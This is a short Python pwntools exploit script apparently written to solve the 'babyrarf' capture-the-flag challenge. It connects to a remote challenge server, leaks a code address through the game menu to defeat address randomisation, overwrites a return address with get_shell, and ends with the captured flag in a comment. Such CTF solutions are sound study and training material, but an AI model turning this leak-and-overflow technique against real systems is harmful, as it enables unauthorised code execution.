from pwn import *

#p = process("babyrarf")

r = remote('35.204.144.114', 1337)
e = ELF('babyrarf')

set_ = False
base = 0
csu_leak = 0

def padd(d):
    return d + '\00'*(8-len(d))

print(r.recvuntil("What is your name?\n\n"))
r.sendline("nasm")
print(r.recvuntil("4. A cr0wn\n\n"))
r.sendline("1")
while True:
    a = r.recvuntil("4. A cr0wn\n\n", timeout=1)

    if not a:
        break
    print(a)
    
    if not set_:
        r.sendline("4")
    else:
        r.sendline("1")

    b = r.recvuntil("You choose attack ")

    if "l0zers don't get cr0wns" in b:
        leak_csu = int(padd(r.recvline().replace("\n", "")))
        print("leak_csu={}".format(hex(int(leak_csu))))
        base = leak_csu - e.symbols['__libc_csu_init']

        print("base: {}".format(hex(base)))

        set_ = True

print(r.recvuntil("Congratulations! You may now declare yourself the winner:\n\n"))

#gdb.attach(p.pid)
r.sendline("A"*40 + p64(e.symbols['get_shell'] + base))
r.interactive()

#union{baby_rarf_d0o_d00_do0_doo_do0_d0o}
